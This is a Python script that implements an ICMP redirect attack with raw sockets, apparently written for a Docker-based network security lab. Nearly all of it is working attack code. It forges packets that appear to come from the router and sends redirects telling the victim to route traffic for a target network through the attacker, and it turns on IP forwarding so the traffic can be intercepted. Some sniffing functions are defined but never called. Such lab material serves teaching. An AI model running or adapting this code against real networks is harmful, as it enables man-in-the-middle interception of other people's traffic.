#!/usr/bin/env python3
"""
ICMP Redirect Attack - Raw Socket Implementation
This script implements an ICMP Redirect attack without using external libraries like Scapy.
It sniffs for victim traffic and sends ICMP redirect messages to poison the victim's routing table.
"""

import socket
import struct
import atexit
import time
import sys
import subprocess
import threading

# ─── CONFIG ─────────────────────────────────────────────────────────────────────
VICTIM_IP = "10.9.0.5"        # Victim's IP
ROUTER_IP = "10.9.0.11"       # Router's IP 
ATTACKER_IP = "10.9.0.105"    # Attacker's IP (us)
TARGET_IP = "192.168.60.5"    # Target's IP on the other network
IFACE = "eth0"                # Interface to sniff on

# ─── PACKET CRAFTING ─────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    """Compute Internet checksum for the data"""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_ip_header(src_ip, dst_ip, proto, payload_len, ttl=64):
    """Create an IP header"""
    # IP header fields
    ip_ver_ihl = (4 << 4) | 5  # Version 4, IHL 5 words (20 bytes)
    ip_tos = 0  # Type of Service
    ip_tot_len = 20 + payload_len  # Total length (header + payload)
    ip_id = 0xabcd  # Identification
    ip_frag_off = 0  # Fragment offset
    ip_ttl = ttl  # Time to Live
    ip_proto = proto  # Protocol
    ip_check = 0  # Checksum (calculated later)
    ip_saddr = socket.inet_aton(src_ip)  # Source address
    ip_daddr = socket.inet_aton(dst_ip)  # Destination address

    # Pack the IP header
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr
    )

    # Calculate and update the checksum
    ip_check = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack('!H', ip_check) + ip_header[12:]

    return ip_header

def create_icmp_redirect(gateway_ip, orig_packet):
    """Create an ICMP redirect message"""
    icmp_type = 5  # Redirect
    icmp_code = 1  # Redirect for host
    icmp_check = 0  # Checksum (calculated later)
    gateway = socket.inet_aton(gateway_ip)  # New gateway address
    
    # Per RFC 792, ICMP redirect contains the IP header + first 8 bytes of original datagram
    original_data = orig_packet[:28]  # IP header (20 bytes) + first 8 bytes of data
    
    # Create the ICMP header
    icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway)
    
    # Combine with original data
    icmp_packet = icmp_header + original_data
    
    # Calculate and update the checksum
    icmp_check = checksum(icmp_packet)
    icmp_packet = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway) + original_data
    
    return icmp_packet

# ─── PACKET SNIFFING ─────────────────────────────────────────────────────────────
def setup_raw_socket():
    """Create a raw socket for packet sniffing"""
    try:
        # Create a raw socket to capture all IP packets
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
        s.bind((IFACE, 0))
        return s
    except socket.error as e:
        print(f"Error creating socket: {e}")
        sys.exit(1)

def extract_ip_packet(packet):
    """Extract the IP packet from Ethernet frame"""
    # Skip the Ethernet header (14 bytes)
    ip_packet = packet[14:]
    return ip_packet

def parse_ip_header(ip_packet):
    """Parse IP header fields"""
    if len(ip_packet) < 20:
        return None
        
    # Unpack IP header
    iph = struct.unpack('!BBHHHBBH4s4s', ip_packet[:20])
    
    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF
    
    protocol = iph[6]
    src_addr = socket.inet_ntoa(iph[8])
    dst_addr = socket.inet_ntoa(iph[9])
    
    return {
        'version': version,
        'header_length': ihl * 4,
        'protocol': protocol,
        'src': src_addr,
        'dst': dst_addr,
        'raw': ip_packet[:20]
    }

# ─── ATTACK FUNCTIONS ─────────────────────────────────────────────────────────────
def send_icmp_redirect(victim_packet):
    """Send ICMP redirect to the victim"""
    # Create the IP header (router -> victim)
    ip_hdr = create_ip_header(
        src_ip=ROUTER_IP,       # Spoof as router
        dst_ip=VICTIM_IP,       # Send to victim
        proto=1,                # ICMP
        payload_len=8 + 28      # ICMP header + original data
    )
    
    # Create the ICMP redirect message
    icmp_redirect = create_icmp_redirect(
        gateway_ip=ATTACKER_IP,   # Redirect to us
        orig_packet=victim_packet # Original packet
    )
    
    # Combine the packet
    packet = ip_hdr + icmp_redirect
    
    # Send the packet
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.sendto(packet, (VICTIM_IP, 0))
    
    print(f"✅ Sent ICMP redirect to {VICTIM_IP}")
    print(f"   Redirecting traffic for {TARGET_IP} to {ATTACKER_IP}")

def process_packet(packet):
    """Process a captured packet and send redirect if it's from victim to target"""
    # Extract and parse IP header
    ip_packet = extract_ip_packet(packet)
    if not ip_packet:
        return
        
    ip_header = parse_ip_header(ip_packet)
    if not ip_header:
        return
    
    # Debug: Print all packets from victim to help troubleshoot
    if ip_header['src'] == VICTIM_IP:
        print(f"🔍 Detected victim packet: {VICTIM_IP} -> {ip_header['dst']}")
    
    # Check if this is traffic from victim to target network (not just specific target)
    if (ip_header['src'] == VICTIM_IP and ip_header['dst'].startswith('192.168.60.')):
        print(f"🎯 Target traffic detected: {VICTIM_IP} -> {ip_header['dst']}")
        send_icmp_redirect(ip_packet)

def setup_ip_forwarding():
    """Enable IP forwarding to allow traffic to flow through attacker"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("✅ Enabled IP forwarding")

def cleanup():
    """Cleanup function called on exit"""
    print("\n🧹 Cleaning up...")
    print("⚠️  Remember to check victim's routing table for redirected routes")
    print("   Run: docker exec victim ip route")

# ─── MAIN FUNCTION ─────────────────────────────────────────────────────────────────
def trigger_victim_traffic():
    """Trigger victim to send traffic to target, then capture it"""
    print("🔥 Triggering victim to send traffic to target...")
    
    def victim_ping():
        try:
            subprocess.run([
                'docker', 'exec', 'victim', 'ping', '-c', '1', TARGET_IP
            ], capture_output=True, timeout=10)
        except:
            pass
    
    # Start ping in background
    ping_thread = threading.Thread(target=victim_ping)
    ping_thread.start()
    
    # Give it a moment to start
    time.sleep(1)
    
    return ping_thread

def main():
    """Main function"""
    print("🚀 ICMP Redirect Attack")
    print("======================================")
    print(f"Victim: {VICTIM_IP}")
    print(f"Router: {ROUTER_IP}")
    print(f"Attacker: {ATTACKER_IP}")
    print(f"Target: {TARGET_IP}")
    print("======================================")
    
    # Register cleanup
    atexit.register(cleanup)
    
    # Enable IP forwarding
    setup_ip_forwarding()
    
    print("📡 Starting ICMP Redirect Attack...")
    print("⚠️  Note: Modern kernels require ICMP redirects to reference actual traffic")
    print("    Triggering victim traffic first, then sending redirects")
    print("")
    
    try:
        for count in range(1, 4):
            print(f"🔄 Attack attempt #{count}")
            
            # Trigger victim to send traffic
            ping_thread = trigger_victim_traffic()
            
            # Wait a moment for the packet to be sent
            time.sleep(2)
            
            print(f"� Sending ICMP redirect #{count} to {VICTIM_IP}")
            
            # Create a realistic packet that victim would send
            realistic_packet = create_dummy_packet()
            send_icmp_redirect(realistic_packet)
            
            # Wait for ping to complete
            ping_thread.join(timeout=5)
            
            # Check victim's routing table
            print("   Checking victim's routing table...")
            time.sleep(2)
            
            print(f"   Run: docker exec victim ip route")
            
        print("✅ Attack sequence complete!")
        print("   Check victim's routing table with: docker exec victim ip route")
                
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")
        sys.exit(0)

def create_dummy_packet():
    """Create a dummy IP packet from victim to target to trigger redirect"""
    # IP header
    version = 4
    ihl = 5
    tos = 0
    tot_len = 28  # IP header (20) + ICMP header (8)
    id = 12345
    frag_off = 0
    ttl = 64
    protocol = 1  # ICMP
    check = 0
    saddr = socket.inet_aton(VICTIM_IP)
    daddr = socket.inet_aton(TARGET_IP)
    
    # Pack IP header
    ip_header = struct.pack('!BBHHHBBH4s4s', 
                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
                           ttl, protocol, check, saddr, daddr)
    
    # Calculate IP checksum
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', 
                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
                           ttl, protocol, ip_checksum, saddr, daddr)
    
    # Simple ICMP ping payload
    icmp_header = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Echo request
    icmp_checksum = checksum(icmp_header)
    icmp_header = struct.pack('!BBHHH', 8, 0, icmp_checksum, 12345, 1)
    
    return ip_header + icmp_header

if __name__ == "__main__":
    main()
